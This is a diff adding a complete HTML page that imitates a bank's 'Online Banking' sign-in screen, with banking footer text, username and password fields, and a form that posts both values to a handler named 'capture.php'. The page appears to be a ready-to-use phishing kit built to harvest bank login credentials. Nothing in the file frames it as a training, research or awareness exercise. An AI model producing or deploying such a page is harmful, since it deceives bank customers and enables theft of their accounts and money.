@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Online Banking — Sign in</title>
+<style>
+  :root{--bg:#f2f4f7;--card:#fff;--line:#d9dee6;--ink:#1c2430;--mute:#6b7686;--accent:#e31837}
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;background:var(--bg);color:var(--ink);
+    font:15px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+    display:grid;place-items:center;padding:24px}
+  .card{width:100%;max-width:420px;background:var(--card);
+    border:1px solid var(--line);border-radius:12px;
+    padding:32px 28px;box-shadow:0 8px 28px rgba(15,25,40,.08)}
+  .brand{display:flex;align-items:center;gap:10px;margin:0 0 20px}
+  .brand .dot{width:34px;height:34px;border-radius:8px;background:var(--accent)}
+  .brand h1{font-size:17px;margin:0;font-weight:700;letter-spacing:.2px}
+  .sub{color:var(--mute);font-size:14px;margin:0 0 22px}
+  label{display:block;font-size:13px;color:var(--mute);margin:0 0 6px}
+  input{width:100%;padding:12px 14px;border-radius:8px;border:1px solid var(--line);
+    background:#fbfcfe;color:var(--ink);font-size:15px;outline:none;transition:border-color .15s}
+  input:focus{border-color:var(--accent)}
+  .field{margin:0 0 16px}
+  button{width:100%;padding:12px;border-radius:8px;border:0;
+    background:var(--accent);color:#fff;font-weight:600;font-size:15px;
+    cursor:pointer;transition:filter .15s}
+  button:hover{filter:brightness(1.06)}
+  button:disabled{opacity:.6;cursor:not-allowed}
+  .err{color:var(--accent);font-size:13px;margin:0 0 12px;display:none}
+  .foot{color:var(--mute);font-size:12px;margin-top:20px;text-align:center}
+</style>
+</head>
+<body>
+<form class="card" id="f" action="capture.php" method="post" autocomplete="off">
+  <div class="brand"><div class="dot"></div><h1 id="bn">Online Banking</h1></div>
+  <p class="sub" id="bs">Sign in to your account</p>
+  <p class="err" id="e">Incorrect username or password.</p>
+
+  <div class="field">
+    <label for="u">Username</label>
+    <input id="u" name="u" type="text" required autofocus>
+  </div>
+  <div class="field">
+    <label for="p">Password</label>
+    <input id="p" name="p" type="password" required>
+  </div>
+
+  <button type="submit" id="b">Sign in</button>
+  <p class="foot">Member FDIC · Equal Housing Lender</p>
+</form>
+<script>
+(function(){
+  var f=document.getElementById('f'),b=document.getElementById('b'),
+      e=document.getElementById('e'),u=document.getElementById('u'),
+      p=document.getElementById('p');
+  f.addEventListener('submit',function(ev){
+    if(!u.value.trim()||!p.value){ev.preventDefault();e.style.display='block';return;}
+    b.disabled=true;b.textContent='Signing in…';
+  });
+})();
+</script>
+</body>
+  </html>
